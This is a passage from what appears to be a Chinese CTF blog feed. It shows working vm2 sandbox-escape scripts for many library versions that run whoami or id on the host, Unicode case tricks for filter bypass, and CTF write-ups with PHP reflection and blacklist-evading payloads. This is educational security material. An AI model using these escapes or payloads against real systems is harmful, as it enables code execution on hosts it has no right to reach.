class="keyword">catch</span>(e)&#123;</span><br><span class="line">truetrue<span class="keyword">return</span> e(<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">"child_process"</span>).execSync(<span class="string">"whoami"</span>).toString();</span><br><span class="line">true&#125;</span><br><span class="line">&#125;+<span class="string">')()'</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.7.0&lt;=vm2&lt;=3.8.2</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">'('</span> + <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">true<span class="built_in">Symbol</span> = &#123;</span><br><span class="line">truetrue<span class="keyword">get</span> toStringTag()&#123;</span><br><span class="line">truetruetrue<span class="keyword">throw</span> <span class="function"><span class="params">f</span>=&gt;</span>f.constructor(<span class="string">"return process"</span>)()</span><br><span class="line">truetrue&#125;</span><br><span class="line">true&#125;;</span><br><span class="line">true<span class="keyword">try</span>&#123;</span><br><span class="line">truetrueBuffer.from(<span class="keyword">new</span> <span class="built_in">Map</span>());</span><br><span class="line">true&#125;<span class="keyword">catch</span>(f)&#123;</span><br><span class="line">truetrue<span class="built_in">Symbol</span> = &#123;&#125;;</span><br><span class="line">truetrue<span class="keyword">return</span> f(<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).mainModule.require(<span class="string">"child_process"</span>).execSync(<span class="string">"whoami"</span>).toString();</span><br><span class="line">true&#125;</span><br><span class="line">&#125;+<span class="string">')()'</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.6.7&lt;=vm2&lt;=3.6.9</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`</span></span><br><span class="line"><span class="string">var process;</span></span><br><span class="line"><span class="string">try&#123;</span></span><br><span class="line"><span class="string">Object.defineProperty(Buffer.from(""),"",&#123;</span></span><br><span class="line"><span class="string">value:new Proxy(&#123;&#125;,&#123;</span></span><br><span class="line"><span class="string">getPrototypeOf(target)&#123;</span></span><br><span class="line"><span class="string">if(this.t)</span></span><br><span class="line"><span class="string">throw Buffer.from;</span></span><br><span class="line"><span class="string">this.t=true;</span></span><br><span class="line"><span class="string">return Object.getPrototypeOf(target);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;)</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&#125;catch(e)&#123;</span></span><br><span class="line"><span class="string">process = e.constructor("return process")();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">process.mainModule.require("child_process").execSync("whoami").toString()</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>vm2&lt;=3.6.8</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`</span></span><br><span class="line"><span class="string">var process;</span></span><br><span class="line"><span class="string">try&#123;</span></span><br><span class="line"><span class="string">Object.defineProperty(Buffer.from(""), "", &#123;value:new Proxy(&#123;&#125;,&#123;</span></span><br><span class="line"><span class="string">getPrototypeOf(target)&#123;</span></span><br><span class="line"><span class="string">delete this.getPrototypeOf;</span></span><br><span class="line"><span class="string">Object.defineProperty(Object.prototype, "get", &#123;</span></span><br><span class="line"><span class="string">get()&#123;</span></span><br><span class="line"><span class="string">delete Object.prototype.get;</span></span><br><span class="line"><span class="string">Function.prototype.__proto__ = null;</span></span><br><span class="line"><span class="string">throw f=&gt;f.constructor("return process")();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">return Object.getPrototypeOf(target);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;)&#125;);</span></span><br><span class="line"><span class="string">&#125;catch(e)&#123;</span></span><br><span class="line"><span class="string">process = e(()=&gt;&#123;&#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">process.mainModule.require("child_process").execSync("whoami").toString()</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>vm2&lt;=3.6.7</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`</span></span><br><span class="line"><span class="string">Object.getOwnPropertyDescriptor(</span></span><br><span class="line"><span class="string">Buffer.from.__lookupGetter__("__proto__").call(Buffer.from),</span></span><br><span class="line"><span class="string">"constructor").value("return process")().mainModule.require(</span></span><br><span class="line"><span class="string">"child_process").execSync("whoami").toString()`</span></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>vm2=3.6.6</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`</span></span><br><span class="line"><span class="string">Object.__defineGetter__(Symbol.hasInstance,()=&gt;()=&gt;true);</span></span><br><span class="line"><span class="string">Buffer.from.constructor("return process")().mainModule.require("child_process").execSync("id").toString()</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>vm2&lt;=3.6.6</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`var process;</span></span><br><span class="line"><span class="string">Object.prototype.has=(t,k)=&gt;&#123;</span></span><br><span class="line"><span class="string">process = t.constructor("return process")();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"" in Buffer.from;</span></span><br><span class="line"><span class="string">process.mainModule.require("child_process").execSync("id").toString()`</span></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>vm2&lt;=3.6.5</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`var process;</span></span><br><span class="line"><span class="string">try&#123;</span></span><br><span class="line"><span class="string">Object.defineProperty(Buffer.from(""), "", &#123;get set()&#123;</span></span><br><span class="line"><span class="string">Object.defineProperty(Object.prototype,"get",&#123;get()&#123;</span></span><br><span class="line"><span class="string">throw x=&gt;x.constructor("return process")();</span></span><br><span class="line"><span class="string">&#125;&#125;);</span></span><br><span class="line"><span class="string">return ()=&gt;&#123;&#125;;</span></span><br><span class="line"><span class="string">&#125;&#125;);</span></span><br><span class="line"><span class="string">&#125;catch(e)&#123;</span></span><br><span class="line"><span class="string">process = e(()=&gt;&#123;&#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">process.mainModule.require("child_process").execSync("id").toString();`</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>vm2&lt; =3.6.4</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`var process;</span></span><br><span class="line"><span class="string">try&#123;</span></span><br><span class="line"><span class="string">Buffer.from(&#123;</span></span><br><span class="line"><span class="string">valueOf: ()=&gt;&#123;</span></span><br><span class="line"><span class="string">throw new Proxy(&#123;&#125;, &#123;</span></span><br><span class="line"><span class="string">getPrototypeOf: ()=&gt;&#123;</span></span><br><span class="line"><span class="string">throw x=&gt;x.constructor.constructor("return process;")();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;)</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&#125;catch(e)&#123;</span></span><br><span class="line"><span class="string">process = e(()=&gt;&#123;&#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">process.mainModule.require("child_process").execSync("id").toString();`</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>vm2&lt;=3.5.2</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;VM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> untrusted = <span class="string">`var process;</span></span><br><span class="line"><span class="string">try&#123;</span></span><br><span class="line"><span class="string">Buffer.from(&#123;</span></span><br><span class="line"><span class="string">valueOf: ()=&gt;&#123;</span></span><br><span class="line"><span class="string">throw new Proxy(&#123;&#125;, &#123;</span></span><br><span class="line"><span class="string">getPrototypeOf: ()=&gt;&#123;</span></span><br><span class="line"><span class="string">throw x=&gt;x.constructor.constructor("return process;")();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;)</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;);</span></span><br><span class="line"><span class="string">&#125;catch(e)&#123;</span></span><br><span class="line"><span class="string">process = e(()=&gt;&#123;&#125;);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">process.mainModule.require("child_process").execSync("id").toString();`</span>;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(<span class="keyword">new</span> VM().run(untrusted));</span><br><span class="line">&#125;<span class="keyword">catch</span>(x)&#123;</span><br><span class="line">true<span class="built_in">console</span>.log(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="javascript大小写特性"><a href="#javascript大小写特性" class="headerlink" title="javascript大小写特性"></a>javascript大小写特性</h2><p>对于toUpperCase():</p><figure class="highlight pf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字符<span class="string">"ı"</span>、<span class="string">"ſ"</span> 经过<span class="keyword">to</span>UpperCase处理后结果为 <span class="string">"I"</span>、<span class="string">"S"</span></span><br></pre></td></tr></table></figure><p>对于toLowerCase():</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字符<span class="string">"K"</span>经过toLowerCase处理后结果为<span class="string">"k"</span><span class="comment">(这个K不是K)</span></span><br></pre></td></tr></table></figure><p>在绕一些规则的时候就可以利用这几个特殊字符进行绕过</p>]]></content>
    
    <summary type="html">
    
      记录一下nodejs的特性和常见弱点
    
    </summary>
    
    
      <category term="CTF" scheme="https://0xcreed.jxustctf.top/categories/CTF/"/>
    
    
      <category term="web" scheme="https://0xcreed.jxustctf.top/tags/web/"/>
    
      <category term="js" scheme="https://0xcreed.jxustctf.top/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>6月刷题记录</title>
    <link href="https://0xcreed.jxustctf.top/2020/06/6%E6%9C%88%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>https://0xcreed.jxustctf.top/2020/06/6%E6%9C%88%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2020-06-01T15:35:00.000Z</published>
    <updated>2022-01-20T16:59:22.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-某师傅出的招新题"><a href="#1-某师傅出的招新题" class="headerlink" title="1.某师傅出的招新题"></a>1.某师傅出的招新题</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment">Flag in flag.php</span></span><br><span class="line"><span class="comment">You can use "readfile" function.</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestClass</span> </span>&#123; &#125;</span><br><span class="line"></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$str1 = $_GET[<span class="string">'str1'</span>];</span><br><span class="line">$str2 = $_GET[<span class="string">'str2'</span>];</span><br><span class="line"></span><br><span class="line">$rce = <span class="keyword">new</span> $str2(<span class="string">'TestClass'</span>);</span><br><span class="line">$a = $rce-&gt;$str1();</span><br><span class="line">$st1 = $_POST[<span class="string">'st1'</span>];</span><br><span class="line">$st2 = $_POST[<span class="string">'st2'</span>];</span><br><span class="line"><span class="keyword">if</span>($st1==<span class="keyword">null</span>&amp;&amp;$st2==<span class="keyword">null</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"GET!!!"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $z = substr($a,$st1,<span class="number">8</span>);</span><br><span class="line">    $x = substr($a,$st2,<span class="number">8</span>);</span><br><span class="line">    <span class="keyword">echo</span> $z.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> $x.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    $z($x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>开始看题的时候很懵，没见过。后面看队友说用反射类做。就在网上找了下这方面的<a href="https://museljh.github.io/2019/04/24/ctf%E4%B8%AD%E7%9A%84php%E5%8F%8D%E5%B0%84/" target="_blank" rel="noopener">CTF题</a>发现这道题 </p><p><code>$a=$rce-&gt;$str1()</code>并不能传参，而且还有些疑惑，干嘛定义个空类 <code>Testcalss</code> 毫无头绪</p><p>然后去看了下<a href="https://www.php.net/manual/zh/class.reflectionclass.php" target="_blank" rel="noopener">php手册</a>找无参的函数，突然 发现<a href="https://www.php.net/manual/zh/reflectionclass.getdoccomment.php" target="_blank" rel="noopener">ReflectionClass::getDocComment()</a> — 获取文档注释</p><p>这个函数有搞头 ，利用注释中的 <code>flag.php</code> ，<code>readfile</code> 和<code>$z($x)</code>不就可以读取文件了吗</p><p><img src="/2020/06/6月刷题记录/image-20200602005512196.png" alt="image-20200602005512196"></p><p>这个题目出的很巧妙。orz</p><h3 id="2-RoarCTF-2019-Easy-Calc"><a href="#2-RoarCTF-2019-Easy-Calc" class="headerlink" title="2.[RoarCTF 2019]Easy Calc"></a>2.[RoarCTF 2019]Easy Calc</h3><p>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $str = $_GET[<span class="string">'num'</span>];</span><br><span class="line">        $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>,<span class="string">'\$'</span>,<span class="string">'\\'</span>,<span class="string">'\^'</span>];</span><br><span class="line">        <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $str)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">"what are you want to do?"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">'echo '</span>.$str.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p> <code>$blacklist</code>中过滤了 <code>^</code> 同时题目设置了WAF，过滤了<code>字母、#、！</code>，所以取反也不能用。</p><p>不过可以使用按位与<code>&amp;</code>以及按位或<code>|</code>。在 PHP 中，将两个数字使用<code>.</code>拼接，会当做字符串来处理，返回的也是一个字符串。例如：<code>(1).(2)</code>出来的就是字符串<code>&quot;12&quot;</code>，然后可以用<code>{}</code>来代替<code>[]</code>来取单个字符。<br> 并且，PHP 中，<code>1/0</code>得出的是<code>float</code>类型的<code>INF</code>，<code>0/0</code>得出的是<code>float</code>类型的<code>NAN</code>，我们也可以把这些转成字符串类型，从而得到字母<code>A</code> <code>I</code> <code>N</code> <code>F</code>。</p><p>E99p1ant师傅的<a href="https://github.red/roarctf-web-writeup/" target="_blank" rel="noopener">Fuzz 脚本</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$char = <span class="string">'1234567890-INFAH@+*%$()"!%meogiakcfhvwbnq_'</span>;</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; strlen($char); $i++)&#123;</span><br><span class="line">    <span class="keyword">for</span>($j = <span class="number">0</span>; $j &lt; strlen($char); $j++)&#123;</span><br><span class="line">        <span class="keyword">echo</span>($char[$i] .<span class="string">'&amp;'</span> .$char[$j] . <span class="string">' '</span>. ($char[$i] &amp; $char[$j]));</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">        <span class="keyword">echo</span>($char[$i] .<span class="string">'|'</span> .$char[$j] . <span class="string">' '</span>. ($char[$i] | $char[$j]));</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">"&lt;br&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后根据这个表，就可以构造代码了。可以构造形如<code>(phpinfo)()</code>这样的形式，来动态执行函数。<br> 值得一提的是，PHP 中函数名是不区分大小写的，因此不一定需要全小写的字符拼凑函数名。<br> <code>phpinfo()</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))&amp;((((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)).(((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))&amp;((((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)|(((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;))).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)))()</span><br></pre></td></tr></table></figure><p><code>(scandir)(../../../)</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;)).(((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))&amp;((((<span class="number">1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))).((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">2</span>&#125;))).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;).(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;).((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;)&amp;((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span class="number">0</span>))&#123;<span class="number">1</span>&#125;))).(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;).((((<span class="number">2</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|((((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">0</span>&#125;)&amp;(((<span class="number">999</span>**<span class="number">999</span>).(<span class="number">1</span>))&#123;<span class="number">1</span>&#125;))).(((((<span class="number">-1</span>).(<span class="number">0</span>))&#123;<span class="number">0</span>&#125;)|(((<span class="number">0</span>/<span class="number">0</span>).(<span 